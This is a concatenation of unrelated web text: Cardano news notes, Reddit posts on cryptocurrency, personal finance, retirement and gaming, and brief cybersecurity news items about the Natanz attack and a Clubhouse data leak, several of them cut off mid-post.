12. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

14. Graph blockchain has announced an acquisition of $300k in ADA for staking purposes. Once the corporate finance world finds understands the dynamic around staking in Cardano, we may see announcements like this with dollar values that are orders of magnitude higher. Right now the corporate world is considering holding BTC on their balance sheets. But, yield on ADA holdings might become hyperattractive to a wide spectrum of companies once they understand the dynamics of staking and that a compounding yield is available for capture.

27. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul. It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline. Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors. [https://www.youtube.com/watch?v=dUDze81LCWs](https://www.youtube.com/watch?v=dUDze81LCWs)
28. Occam Association President, Mark Berger, also did an interview with Rick McCracken on Cardano Live. He provided some good detail on what Occam would like to deliver and where they currently are in their development. [https://youtu.be/vTBLIZ7voz8](https://youtu.be/vTBLIZ7voz8)
29. Tomorrow we’ll hit the items from the roadmap video that Charles just did.
30. Cardano is now being used as a traceability solution in conjunction with Scantrust for wine from the Nation State of Georgia. This is a great use case for the Cardano blockchain! [https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/ https://www.scantrust.com/](https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/)
31. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
32. Ourobouros Omega. Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon. Ourobouros Praos was 2017 and it’s still running now. Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
33. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server. Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year. It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain.
34. Today will be Part II of the coverage of the lates Roadmap vid from Charles. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
35. Sidechains. They call the main chain the “Cardano Settlement Layer” (CSL) and the side chains are called “Cardano Computation Layers” (CCL). They are looking at having CCLs for the EVM, IELE, Catalyst, and WASM (web assembly). They are trying to figure out how to pay for the maintenance of these side chains. A current thought is to possibly create a mechanism where you can “refine” ADA to get “fuel” for these sidechains. You could even have a Plutus side chain that runs on its own fuel. This year they will propose a Cardano Improvement Proposal (CIP) to see if the community wants to update the monetary policy in an HFC event to go in this direction. This could be a good way to include the parachain ideas from Polkadot. They could also add Hyperledger related permissioned sidechains with this.
36. Layer Two. A lot of deal flow with Prism right now around digital identify for things like authenticated wallets, KYC/AML, regulated DeFi, and human readable addresses. Charles will probably do a full video on this. Hydra is the other piece of off-chain infrastructure for this year. IOHK has a whole team working on this. They’ve already put out two papers on this. Will put out two more papers this year and a prototype will also be on the way. Hydra will be run by the stake pool operators.
37. “With all this, we’re going to piss all over what ETH 2.0 is trying to accomplish”. I’m paraphrasing slightly, but I almost spit out my coffee when he said this.
38. Quantum Resistance. This will be a big project involving: QR VRF, QR zero knowledge stuff, quantum signatures, and modeling of a quantum adversary. This is a huge amount of work. But this is a whole agenda that is in scope for Cardano 2025.
39. Catalyst &amp; Voltaire. Right now Catalyst is mainly about treasury but it needs to be linked to Voltaire which is all about protocol updates. This will probably mean a bicameral voting model that controls hard fork combinator events.There will be DAO as a service to provide voting rights for your users if you build a dApp or other project on Cardano. They will move from the current plutocracy to something that is hybridized between the current system and “proof of merit”. This is going to require a lot of thinking around the social science behind governance. It will be a more nuanced power dynamic.
40. Approach to the Reference Client.Right now it’s just Haskell, they will probably also build out clients in Python and Rust. Eventually they may have things like Agda, Idris, or Coq at the core. This notion of a “Core Developer” could end up being a digital identity that is authorized through voting.
41. Commercial. On the commercial side they are really going to scale things up to the eight figure level. There’s a lot of good news coming there. Charles says he is reserving that for the Africa Special.
42. Coinbase now has a Cardano Explainer. [https://www.coinbase.com/learn/crypto-basics/what-is-cardano](https://www.coinbase.com/learn/crypto-basics/what-is-cardano)

48. Dewayne Cameron was on Cardano Live.  Whether you are interested in DeFi or not, this is likely to be one of the big early Cardano based projects.  This interview has all the latest info on Liqwid.  Sounds like the alpha testnet will be end of April/early May with three or four core contracts. Rick does a really good job of asking questions that a large spectrum of listeners will be able to relate to and they get into the details of how the contracts will work.  At 20:01 Dewayne mentions a “Cardano Dex, or the Dex that IOHK and Emurgo are working on...”  Very interesting tidbit there! [https://youtu.be/JhO5iC08xSA](https://youtu.be/JhO5iC08xSA)
49. The Plutus Pioneer program has been open sourced!

61. LunarCrush interviewed Charles and he gave us some more details on the Ethiopia deal and Africa:  1) the IOHK office in Ethiopia is merging with the Singularity Net Office (it’ll be 30-50 people...so pretty large presence); 2) Africa special to be announced very soon; 3) they will be doing fintech &amp; govtech, 4) everything on the governance side is going to be upgraded across a wide swathe of African nation states in next ten years, 5) lots of possible use cases including supply chains in agritech, putting land on a ledger, voting, identity, reputation (i.e. credit), &amp; payment systems; 6) Africa is like investing in China in the 1980s; 7) the demographics of Africa make it a really easy call to direct investment there; 8) charles said “Ethiopia, in particular, is very special to us and WE HAVE ACTUALLY CLOSED SOME DEALS...we’ll talk about those at the Africa Special”; 9) there will be security token plays in Africa in the mid 2020s since there are no stock exchanges; and 10) there is a big unannounced partnership called “the DCF” with a brand name consultancy we will recognize.

CryptoCurrency,"The USD is a big, steaming Shitcoin.","Since the creation of the Federal Reserve system in 1913, the purchasing power of one USD has fallen over the last 107 years by 26 times.

Too simple? Let's have some fun with this. 

Here's some perspective: Imagine opening your wallet right now, grab one dollar, and let's see what that could get you during the peaks of the bull runs of the mighty USD. Step into the DeLorean, type in 1913, and let's punch it to 88 miles per hour!

In the year of 1913, your one dollar could get you 30 Hershey's chocolate bars because adjusted for inflation, it equates to over $26 in today's money. Starting strong so far. You might even consider cashing out here and living in comfort with 26x your current net worth. But let's continue on the tour.

In 1929, the Great Depression hit and most of the United States was devastated.  I hope you ate some of that chocolate because almost half of that has melted 16 years later. Your dollar is now worth $15 and can get you 10 toilet paper rolls. Fun fact, the old US dollar is now weaker than a roll of toilet paper.

Don't worry though, buckle up because here comes a bull run! In just 4 years, the economy has recovered enough for your dollar to be worth $19! It's up 26% in just four years! Wee! You could get ten bottles of beer if you wanted! But don't drink any because we're driving through the speedway now! It's all downhill from here, so put on your helmet! 

1940s - your dollar gets you 20 bottles of Coca Cola ($15)

1950s - 10 bags of pretzels ($10)

1960s - one drive-in movie ticket ($8)

1970s - 17 oranges ($6)

1980s - 2 boxes of crayons ($3)

1990s - 4 grapefruits ($1.60)

2000s - 2 lemons ($1.20)

2010s - 2020 - one cup of McDonald's coffee. ($1)

Ba-da da-da OOF! What a ride. Well this is the end of your fare, and I'm sure you can see where the future of the almighty dollar is headed, so I will leave you here in the present where the dollar is still worth a cup of coffee. If you don't think it can get worse, take a look at Venezuela. The hyperinflation drove the masses to adopt crypto as monetary currency, and it's working.

If you're holding coins that have gained you even 10%, you're way ahead of the inflation for the USD which has normally been 2 to 3% per year.

Bitcoin grew astronomically since its inception, and everyone I've met would give anything to stop at 2010 with that one dollar.

So long and good luck!",cryptocurrency

personalfinance,2019 taxes questions.,"Greetings!

Total beginner and noob at everything tax-related.

I did NOT file my 2019 taxes (federal or state) because during COVID my guy was unreachable, since then I managed to get another guy but he has been slow to file and is only now (this week) corresponding with me, asking for documents, etc...

Why didn't I file? I was ignorant about the process for extensions and COVID prohibited me from contacting someone new, financial issues made it ""impossible"" to afford a true professional that ~~would~~ wouldn't ~~charge~~ charge a lot of $.

My 2019 employer did retain something from my paycheck but I don't know what. I have:

SSA statement with ""Taxed ~~SS~~ Social Security Earnings"" and ""Taxed Medicare Earnings"", and

IRS' ~~""Form W-2 Wage and Tax Statement""~~ ""Wage and Income Transcript – Form W-2 Wage and Tax Statement"" and ~~others~~ 3 other documents available on their website.

I do NOT have my employer-provided W2 and only have paystubs for most (99% missing first, last, and possibly some in between) of payments received.

My questions:

1. Am I screwed?
2. Am I too late?
3. What numbers should I start calculating for my guy to have?
4. Is there any ""special"" COVID guidelines (specifically for 2019 taxes)?
5. Is there ANYTHING I can do like attach a statement for good cause of late filling or similar?
6. I read online about penalties for unpaid taxes, but IF my employer withheld the correct or more amount, do I have any ""unpaid"" taxes?

PS. I already expect a ""employers have to provide W2s according to xxx"" and although this is important I'm more immediately interested in getting out of this situation with the ""man"", and then I'll try and get that from them.

Thanks!

retirement,Can we actually retire in our 50s?,"Good morning retirement community.  I am hoping to get some feedback on my plans from those who have successfully retired.  First some background: my wife and I are in our mid forties.  We both grew up in what I would describe as middle class families (to give you a sense of what that means to me, my parents sold my childhood home for less than $100,000 about 4 years ago, but they managed to squirrel away $1 million for retirement.  My in-laws don't have a lot of savings left over but my father in-law gets a federal pension that they live off. I think we agree my parents did a better job planning for retirement).

My wife and I went to college and earned degrees from competitive schools in competitive fields and have both done a lot with what we have.  We have two kids that are in elementary school, and based on our savings patterns their 529s should cover the bulk if not all of their college expenses.  Here's where I struggle.  Our parents were able to retire in their mid 60s but they live much more modest lifestyles than we hope to.  However, we both make way more than I ever thought we would and I think we can retire around 57-59 (12 years).  I am uncomfortable disclosing how much we make, so I have put together the following figures based on an income of $150,000 (we make a multiple of that).  When you look at it I assume we'll be spending about 55% of what we bring in and that will be a withdrawal rate of about 4.2% of our liquid net worth.  The 55% probably seems low, but we actively save for college on top of the 20% of our salaries, and we have a 20 year mortgage that will be gone 8-10 years into retirement, and of course we are raising two kids which probably costs around 5%-10% of our annual income.  The illiquid assets are investments that are tied-up and I have used a very conservative growth rate on those although there is a chance they will be worth much more.  We will have no pensions and I assume we won't get SS either.  What am I missing?  Does it seem doable? (note we live in a very expensive part of the country and may sell our house and put more cash in our pockets at retirement but I haven't added that here).

CryptoCurrency,Blockchain's effect on the Car industry,"So, a lot has been said about Tesla buying Bitcoin, but this is really not the point of my post. I'm not here to talk about companies buying bitcoin.  

What many newcommers fail to understand, is that Bitcoin will not revolutionize the world (sorry), but blockchain will. I am bullish in bitcoin and see it's potential, nevertheless that is dwarfed by the actual impact of blockchain in the future world.

I talk about the automobile industry because I know it up close from work. I think blockhain has infinite possibilities here from:  
- Defi, obviously, this can be said for all companies in any sector. It can increase transparency, reduce effort, increase efficiency and reliability.   
- Blockchain in the supply chain can help make it more efficient. You can use it for traceability of components, which in effect mean being able to instantly detect which cars have a defect ( this is just an example, lots of others).   
- Car &amp; Ride sharing: I work for a car manufacturer and I cam tell you this worries them the most. They are investing here heavily to try to gain some ground in this market before uber or others take it all. Imagine having ride shares provided with a blockchain that allows trust between individuals without a third party like Uber. The potential here is MASSIVE.   
- Insurance, maintenance etc: Instead of getting a Carfax report you could get it directly from a blockhain were all information about all reparations is maintained. Same for insurance, accidents etc.




This is a very simplified vision, I just wanted to give you an insight of one sector of the economy and the many implications blockchain WILL have on it.",cryptocurrency

## Israel carries out cyberattack on Iran nuclear facility

Israel appears to have confirmed claims that it was behind a cyber-attack on Iran’s main nuclear facility, the Natanz reactor yesterday, which Tehran’s nuclear energy chief described as an act of terrorism. Israel imposed no censorship restrictions on coverage as it had often done after similar previous incidents and the apparent attack was widely covered by Israeli media. Public radio took the unusual step of claiming that the Mossad intelligence agency had played a central role. Natanz was the location of the infamous CIA-and-Mossad Stuxnet virus attack in 2010 that caused widespread disruption and delayed Iran’s nuclear program for several years, and is part on an ongoing series of recent strikes and counterstrikes between Israel and Iran.

## Personal data of 1.3 million Clubhouse users reportedly leaked online

The data was leaked to a popular hacker forum, according to a Saturday report from Cyber News. The leaked data of the invite-only chat app includes names, social media profiles, and other details. Although this type of data seems innocuous compared to addresses or social security numbers, researchers stress that the data can be used in phishing and social engineering scams. Clubhouse has since responded by saying they have not experienced a breach of their systems and said that the data is already publicly available and that it can be accessed via their API.

## Cyberattacks are the number-one threat to the global financial system, Fed chair says

In an interview that aired on CBS’s “60 Minutes” on Sunday, Federal Reserve Chairman Jerome Powell said cyberattacks are now the foremost risk to the global financial system, even more so than the lending and liquidity risks that led to the 2008 financial crisis. He cited examples of large firms losing the ability to track payments they are disbursing, thus hamstringing the flow of money from one financial institution to another. That could shut down sectors or even broad swaths of the financial system, he said. The comments were made in the context of his predictions of a rebounding post-pandemic economy balanced against the prospect of additional economic hardships from another resurgence of the COVID-19 virus.

Bitcoin,There is no such thing as “real” or “intrinsic” value,"All value is perceived, there is no such thing as “real” or “intrinsic” value. Only scales in the number of people who percieve a thing to be useful. Value is derived only from a persons perception (or group of peoples perception) of a thing being useful. Even the dollar. We percieve it to be valuable because we believe it will be useful in that we can exchange it for goods or services in the future. And it only really achieves that usefulness because enough people percieve it will hold its relative value (perception of usefulness) between now and when they intend to exchange it.

To quote satoshi:

“The root problem with conventional currency is all the trust that’s required to make it work. The central bank must be trusted not to debase the currency, but the history of fiat currencies is full of breaches of that trust.”

Current monetary policy is resulting in a trust crisis and people, companies and in some cases governments are turning to a system that implements trustless monetary policy. When we buy bitcoin we don’t have to trust anyone and we can have certainty that no individual, company or nation state can control, change or manipulate the monetary policy or integrity of the ledger.

Perceptions are changing. In bitcoin we trust.",cryptocurrency
CryptoCurrency,Ethereum Successfully Launches Berlin Hard Fork,"Ethereum’s latest update went live at block 12,244,000 this morning.

  Key Takeaways

* Ethereum’s Berlin hard fork has gone live.
* The upgrade included several Ethereum Improvement Proposals focussed on changes to gas costs and transaction types.
* Ethereum will follow Berlin with its highly anticipated London hard fork this summer.

 

The second-biggest blockchain by market cap completes another major upgrade. 

## Ethereum Berlin Fork Launches 

Ethereum has just completed its Berlin hard fork. 

The update went live on Ethereum’s [block 12,244,000](https://goto.etherscan.com/block/12244000) this morning. Initially [confirmed on Mar. 8](https://blog.ethereum.org/2021/03/08/ethereum-berlin-upgrade-announcement/), the fork comprised four Ethereum Improvement Proposals. Abbreviated as “EIPs,” anyone can submit an Ethereum Improvement Proposal, and those accepted by the community get implemented into the blockchain. 

The first was EIP-2565, which lowers the gas cost for modular exponentiation, otherwise known as the “ModExp” function. The fork also included EIP-2929, which Vitalik Buterin and Martin Swende [put forward](https://eips.ethereum.org/EIPS/eip-2929). EIP-2929 increases gas costs for state access operations (otherwise known as “opcodes”) and adds security improvements to the blockchain. The update also introduced EIP-2718 and EIP-2930, which involve defining a new transaction type for future transactions and adding a new transaction type that includes access lists. 

The Berlin fork involves several complex technicalities, but it had been anticipated across the community nonetheless. Many key Ethereum supporters took to Twitter to celebrate the milestone as it happened this morning. 

There were also two watch parties, hosted by [ETHStaker](https://www.youtube.com/watch?v=4R638fPK3NQ) and [Ethereum Cat Herders](https://www.youtube.com/watch?v=GQcXUn5XG5c), two of Ethereum’s strongest communities. 

## EIP-1559 Looming 

Berlin’s completion takes Ethereum one step closer to London, the hard fork that will include its long-awaited EIP-1559 update. Tim Beiko, the coordinator for the various implementers and researchers working on EIP-1559, explained to Crypto Briefing that EIP-2929 and EIP-2718 are essential “prerequisites” in the lead-up to the update. 

EIP-1559 involves introducing a base fee to transactions, which represents the minimum amount of gas a transaction needs to get added to a block. This fee will then get burned, which will in turn reduce the supply of ETH (Beiko has previously referred to it as an [“ETH buyback”](https://cryptobriefing.com/ethereum-miners-oppose-eth-buyback-proposal/) proposal). It should also make the cost of transactions easier to predict—one problem with the current mechanism is that gas prices get entered as an estimate, which means many users overpay for transactions. 

Due to the improvement it’s expected to make on Ethereum’s monetary policy, EIP-1559 is the network’s most anticipated update since the Beacon Chain launch. However, some miners have [opposed the update](https://cryptobriefing.com/ethereum-miners-protesting-eip-1559-has-accelerated-upgrade-eth-2-0/), arguing that it will threaten the security of the network. It’s expected to ship in July or August. 

The merge phase of Serenity will follow the London hard fork. The Beacon Chain will be docked to Ethereum mainnet, marking the network’s long-awaited transition to Proof-of-Stake. Ethereum researcher Justin Drake recently ran a poll on when Proof-of-Stake could feasibly go live, to which Vitalik Buterin and others responded in favor of shipping the update this year. Drake [told Crypto Briefing](https://cryptobriefing.com/key-ethereum-researchers-vote-to-ship-proof-of-stake-in-2021/) that he was “confident” it will launch in 2021 at the time. 

The Serenity roadmap will finally see 64 new shard chains go live, marking the completion of Ethereum 2.0. 

With various [Layer 2 solutions](https://cryptobriefing.com/ethereum-scaling-solution-optimism-delays-launch-july/) also in development, it’s been a big year for Ethereum so far. The action has been reflected in its price: it currently has a market cap above $283 billion, with ETH trading at $2,446. That’s about 12.4% of the whole cryptocurrency market. 

*Disclosure: At the time of writing, the author of this feature owned ETH and several other cryptocurrencies.*

personalfinance,Using savings to pay debt,"Hey, I have about $5k in savings. I’m about to leave for a month of training in the military. It pays me significantly less than my regular job, but I budget out a month ahead for bills already. I was thinking about paying off a high interest credit card before I leave (22%, and I goofed and paid my bill a day late so my minimum payment is about $250 for the next 6 months :/) . It’s about $3300. It leaves me with about $1700 for an emergency or if I need to supplement my income when I get back. I was thinking I could start rebuilding that savings back up when I get back home. 

Another option is I wait for my federal tax refund and put $1k of that to that card and $2300 from my savings. Leaving me with a bigger cushion. Is this a bad idea? Should I just keep chipping away at it?",finance

personalfinance,What are the best loan options available for paying past due tuition at a university?,"I attended a university in the US in the past (over one year ago), and still owe them a significant amount of money for tuition in the $10,000+ range.  I am now seeking the best options for taking out a loan to pay the bill in order to get credits transferred to a different school.

I am trying to get the best loan terms possible, and it seems private student loans are not going to be an option because they generally are to be disbursed for current or future semesters, and have varying restrictions on how much time can pass before I am no longer eligible for a student loan (some are 90 days, some approximately 1-2 semesters in the past).

My question is, is anyone aware of any student loans or lending institutions that would lend to someone in my situation?  I am really trying to avoid anything more than 10% APR on a 4 or 5 year loan, and realistically would like it to be under 7% if possible.  I am aware of the option to get a personal loan, but interest rates seem to me vastly higher than student loans, and I am kind of bummed that I can't get private funding for past-due tuition.  Unfortunately this is an absolute necessity, so I will end up taking out a private loan if it comes down to it.  I do plan on paying the loan down early when my income increases.

Any advice?

PS

Does anyone have insight into the approval process?  Say I make $40,000 a year and want to get approved for a $10000 loan, for a Debt-to-Income Ratio of 0.25.

personalfinance,Any advice on cashing out an annuity?,"I have an annuity with $70k+ that my family set up. I'm only 23 and the money in that annuity is hardly making anything, so I'd much rather invest the money elsewhere or hand it over to a CFP. Problem is of course that if I take out more than 10% I will have to pay IRS penalties of 10% of whatever I withdraw, in addition to taxes. And if I withdraw the entire balance of the annuity I will be in the 32% federal income tax bracket as my income this year should fall around $110k. Here are my options (that I've thought of):

1. Withdraw half of the annuity this year, and half next year to avoid falling in the higher tax bracket, pay the penalties
2. Withdraw 10% every year and eventually cash it out once it's at a lower amount

CryptoCurrency,Best Use Cases for Blockchain Technology,"When I first learned of blockchain technology of course it was easy to see that cryptocurrency was the most straightforward use case because by that time Bitcoin had already proved itself out and there were many others trying to improve on the path BTC carved out. While it was easy to see the value of cryptocurrencies I was interested in what was next.  What would be the next use case of blockchain technology that would disrupt an industry causing coins worth pennies to exploding and be worth thousands of dollars.

I know I can’t be the only one looking for the next earth-shattering idea that will blast their rocket right past the moon and straight to Jupiter.  I am hoping here we can share the projects we are aware of that have different use cases other than just “traditional” crypto, especially if they might not be hot or hyped right now so we can invest early and potentially make generational wealth if they do create a new standard.  

If you cannot explain what you can use the coin for, or what it does, it does not belong in this thread.  I will post two I have found and please share others we might not all be aware of.  Let’s find the next big thing together.

1. Wagerr (WGR) – It is the first and only sportsbook on the blockchain.  To be clear this isn’t like the hundreds of centralized sportsbooks that accept crypto as payment, everything actually takes place on the blockchain. Bettors hold their coins in their own wallet; in control of their funds at all times. Bets are placed on the blockchain and winning bets are paid out by smart contracts after game results are fed onto the blockchain by an oracle system. Investors can “be the house” as normal sportsbook “profits” are distributed to those holding WGR. Why is a sportsbook on the blockchain needed? No geo-restriction, no more giving your personal info to off-shore books, being able to bet as much as you want with no limits, and no more begging for withdrawals from a sportsbook holding your money. Wagerr is fully functional and on average there is over $100,000 worth of WGR bet on sports every single day on the platform.

2. GET Protocol (GET) – It is a blockchain based ticketing system, think sports games, concerts, events. You might think why is this revolutionary? First, no more getting scammed as you can verify each ticket’s authenticity on the blockchain. This is cool, but what I think is game changing is tickets as NFT’s. Now you can write rules into the tickets. The best example I think there is of this is imagine being a ticket seller and writing a rule that if the ticket is resold by the buyer at a profit (aka the ticket is scalped) that 50% of that profit will go back to the original ticket seller. Do you now see why every band, NFL team, etc. would want to use GET for their tickets? GET is also operational and selling tens of thousands of tickets as we speak.

These are the two best “new” blockchain uses cases I am aware of.  I just found out about GET through a friend a few months ago. I’m sure there are many more I am unaware of, please share in the comments.  PLEASE DO NOT JUST WRITE THE NAME OF THE COIN, save us all a little time like I have and give us a brief breakdown of the use case and why it could change the game.",cryptocurrency
personalfinance,Should I increase my withholding or am I better off paying the penalty next year?,"This year, I must have under-withheld my federal taxes (only selected 3 allowances), so I owed $1800 for 2020.

My accountant advised me to increase my withholding and prepay 2021's taxes by sending in a $500 check every quarter until next April. I was told that because I under-withheld for 2020, I also incurred a $13 penalty fee.

The majority of my paycheck gets invested as my expenses are very low. 

With that being the case, am I better off adjusting my withholding higher, prepaying, or investing the extra money throughout the year and paying a penalty? Is the penalty always so nominal for under-withholding or is it based on something else that I should be concerned about?",finance
CryptoCurrency,A resource for those who have their funds locked on Binance (or Coinbase),"Hello community,

My recent ordeal with Binance has turned me into a Redditor and I hope everyone here can try to avoid what I had to go through and what a lot of us are still going through.

**Summary of what happened on Binance (and read similar with Coinbase):**

* been using Binance since 2017 (the first bull run)
* been verified since 2017
* wanted to withdraw 6 different coins to wallet
* successfully processed 3 coins but when I got to ADA, my account was flagged RISK CONTROL
* opened first ticket, submitted about a dozen very unrealistic videos (ie. record a video logging into Binance, indicating which coins I wanted to withdraw and how many, all under 25mb)
* fast forward a week, my first ticket was closed without resolution
* opened a second ticket, submitted all videos again; decided to do some research on Reddit and seems like I was one of hundreds; ticket again was closed after a few weeks
* finally onto my third ticket and I was **fed up** and started to become an activist with Twitter and LinkedIn outreach to journalists and Binance employees
* ticket was finally resolved after I successfully reached out to an employee on LinkedIn after 8 weeks

**Tips on what I learned that may help IF you are already blocked from your account:**

* as there's no timestamp, I have learned to timestamp myself daily. This is the template that I use: ""11.20AM on April 15, 2021.  No update from Binance. ""
* daily screenshots of the timestamp and into a seperate folder in case I need to provide evidence to the journalists in my social media outreach
* reach out to journalists via LinkedIn, Twitter and other social media platform to gain traction

&amp;#x200B;

**Tips for those who are using Binance just fine:**

* have a backup exchange
* ensure that you are fully verified!!!!!!!!!!!
* make sure you CAN use their exchange and your country is NOT banned from using any exchanges!!! CANNOT STRESS THIS ENOUGH....IF YOU DO THIS IS YOUR OWN FAULT.

personalfinance,It is wise to try buy this apartment,"I am wishing to buy an apartment. I've been living with a family for some time and rent is cheap but I would like my own space and I'm not sure if I my hopes are too high.

So currently this place is going for 1.7million SEK (i live in Sweden but not Swedish) I have about 380000SEK saved and the bank has promised a loan of up to 1.9SEK. My issue is that apartment in Sweden are like CO-OPs in the US. So every month you pay a fee for the upkeep of the building it also includes heating,water, TV/internet sometimes. The contribution is about 5300SEK a month and electric and insure is another 500SEK on top of that a month.
I have to put 15% of the place as a down payment which I can do. The current interest rate is 1.3% and calculating the contribution,paying back the loan and the interest as well as the electrical and insurance it comes to about 9500SEK a month and I take home about 26500SEK a month after tax and I will also need a car which will cost fuel/insurance/tax.

I am slightly afraid that interest rates will jump up and I'll be left in a not a great spot. The monthly contribution feels like a lot but Its about the average amount for places in my area. 

So it seems like I can on paper but it might be a stretch and maybe a foolish decision if things go awry? 

I'm kinda looking for some advice as I feel like there is stuff that I am missing.

Oddly enough, we will have enough money saved and the proceeds from selling our house can pay off our 50k of student debt.

Our initial plan was to use the 50k toward a down payment toward our new house, but would it be smarter to use a minimal amount toward a down payment and using the rest to pay off our high interest rate student debts?

Using an affordability calculator, which I take with a grain of salt, it concludes that we would be much better off paying off our loans. We would be able to afford much more in a house, like 75k more comfortably.

personalfinance,Refinancing Fiancé’s Car,"I co-signed on my fiancé’s car a year ago due to their credit score being tanked from several delinquent accounts (small things roughly ~$1500 total) from before we met when they were 18.

Their score has been steadily going up since then according to credit karma (~670 now which I know credit karma isn’t totally accurate).  Figured it might be a good time to refinance to lower the 5% interest rate we got (my car is 2% by comparison). Local credit union wasn’t able to approve the loan with them as a cobuyer due to the credit. 

I’m tempted to go through with it under my name only (I was already approved before trying to add them as a cobuyer) to save the $2000 in interest roughly but am thinking that’s a bad idea as it’ll only hurt their score with the auto loan in good standing being paid off and closed on their report.  Am I right in thinking that and we should focus on settling the several year old delinquent accounts and maybe try to apply again in six months after that’s done?

gaming,The state of the gaming industry today is unacceptable,"This is not an original thought, and it’s not exactly news to anyone. I feel I need to air my grievances though, because I think a lot of people are as frustrated as I am. 

The following is a chronicle of my personal gaming experience that illustrates why I am so fed up with the gaming industry as a whole. 

TL;DR at the bottom

To begin with, I just uninstalled NBA2k21. 2k had been ignoring community feedback since the game came out, and with every update they made the game more unbalanced, less diversified, and increasingly just... stale. I was no longer having fun, especially since (where my 2k players at) 2k just released a patch that nerfed the shot stick AGAIN. The shot stick was the ONLY rewarding mechanic in that game for me. The only thing that made the game feel like more than “basketball simulator 3: same as the last 2”. So I uninstalled. 

No big deal right? Once you decide you’re no longer having fun that’s what you do. You uninstall and move on. 

So what else is in my Xbox library? Like 3 things, because COD:Warzone ALONE is like 150GB, and it’s the only download pack I even have. I didn’t used to mind terribly, because I played that game all the time, but anyone who has played that game in the last few months will tell you that Activision is actively ruining it. With every update the game gets bigger, runs worse, and you see more and more obvious pay-to-win cosmetics. The community has been loud and clear that what they’re doing has ruined the game, but do they care? No. They’re already working on the next game, and the small team they left behind to maintain this mess is busy working on new cosmetics so that you will buy the next season pass. I’m really close to uninstalling that too. 

But hey, at least I’m a fan of single player RPG games. At least when I reach the limit of my tolerance for the money grubbing, meta chasing, sweaty online multiplayer experience I can just relax with a slower paced single player experience. But guess what the last solo RPG game I bought was... CUBERPUNK 2077. I don’t even need to explain to you what happened with that one. I went through hell to get a refund for that alpha build garbage. (Edit: I haven’t been keeping up with patches and updates for this game. My opinion is probably outdated.)

WHERE CAN I TURN TO? should I really just dump more hours into skate 3? A game that came out like 10 years ago?? Do I need to play through Skyrim or bio shock again just to get a hit of that sweet polished game experience? I mean I fucking will, but now I’m bitter about it. 

Gaming has been one of my favorite hobbies for literally my entire life, and I’m on the brink of abandoning it. I suppose it wouldn’t do me harm to find a different hobby; preferably one that is considerably less consistently frustrating and disappointing. I’ll always have the games that are close to my heart, but I don’t have hope that the trends of the gaming industry will fall back towards rewarding the end user experience. It’s too lucrative to just toss more cosmetics at our faces every 2 months for another $10. I’m coming to terms with it but it just makes me sad. 

TL;DR: every game I have bought and tried to enjoy recently has failed me, and it’s beginning to make me lose hope in my ability to enjoy gaming.

So how are my fellow gamers feeling right about now? I’m sure we all have plenty of opinions after a year of quarantine. Let me hear it.

Edit: everybody is saying the same thing. There’s plenty of good games out there. Don’t play the bad ones. I know. I have dozens of games that I love, but they’re getting older and fewer and further in between. I’m not saying the whole gaming industry is garbage. I’m saying it’s changing for the worse.

2nd edit: thank you to those who were willing to have a discussion with me. To the others, you make this community toxic and give it a bad name. People like you are half the reason I fail to have fun playing online games lately. I’m leaving this here and bouncing. I don’t want to have anything to do with this community.",technology
personalfinance,"Still paying off car that will now require additional, expensive repairs; looking for options.","Hey guys, I’m in a bit of a pickle here, and not even sure where to begin researching my options, so hopefully someone can share some kind of insight.

I purchased my car about 2 years ago, a 2015 Nissan Sentra. I haven’t always been the most confident driver, so to speak, and so I’ve had to do some work on it, mostly replacing tires but also some heavy front right axle/tie rod repair work (I wish I could explain more, but my friend did the work and I have little clue about cars). Beyond that, I’ve had to replace the front driver’s side door, as well.

Over the past year, I’ve barely been driving the vehicle, but it is still mobile, so I let my brother borrow it for work after he ran into car trouble. He’s been using it for about two months, but now (not saying it’s connected to his driving at all) it’s acting up again. We’ve self-diagnosed it as being either the tensioner rod in the transmission or the shifting belt, but I am hoping to get it looked at by someone other than YouTube soon. Either way, since it’s transmission related and apparently Nissans have a transmission with planned obsolescence in mind, I know it’s going to be expensive.

As for the vehicle, there’s still a balance of a little under $7,000 left on it, and I’m paying about $200 monthly, with a 14.99% interest rate, which I’m given to understand is rather high (I had no credit and bought my car through my credit union’s first time buyer program). I have a perfect history of making my car payments on time. I do have insurance on it (not full coverage), as well as gap insurance through my credit union. I currently live in Florida in the United States.

